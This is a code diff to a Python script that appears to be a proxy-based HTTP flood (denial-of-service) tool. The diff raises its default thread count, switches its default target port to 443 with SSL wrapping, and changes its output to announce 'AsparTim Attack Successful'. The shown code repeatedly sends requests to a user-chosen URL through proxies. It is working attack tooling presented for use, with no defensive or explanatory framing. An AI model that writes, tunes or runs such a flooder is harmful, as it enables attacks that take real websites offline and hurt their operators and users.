@@ -174,12 +174,12 @@ def main():
 	if url =='':
 		input("[!] Error Input ! Try Again")
 		return main()
-	port = str(input('[+] Port (Default Is 80) : '))
+	port = str(input('[+] Port (Default Is 443) : '))
 	if port =='':
-		port = int(80)
-	thr = str(input("[+] Threads (1-800 Default Is 300) : "))
+		port = int(443)
+	thr = str(input("[+] Threads (1-800 Default Is 400) : "))
 	if thr =='':
-		thr = int(300)
+		thr = int(400)
 	else:
 		thr = int(thr)
 	per = str(input("[+] Power (1-100 Default Is 70) : "))
@@ -217,11 +217,11 @@ def atk():
 			if str(port) =='443':
 				s = ssl.wrap_socket(s)
 			s.send(str.encode(request))
-			print("From ~["+ str(proxy[0])+":"+str(proxy[1])+ "]")
+			print("[+] AsparTim Attack Successful ["+ str(proxy[0])+":"+str(proxy[1])+ "]")
 			try:
 				for y in range(per):
 					s.send(str.encode(request))
-				print("From ~["+ str(proxy[0])+":"+str(proxy[1])+ "]")
+				print("[+] AsparTim Attack Successful ["+ str(proxy[0])+":"+str(proxy[1])+ "]")
 			except:
 				s.close()
 		except:
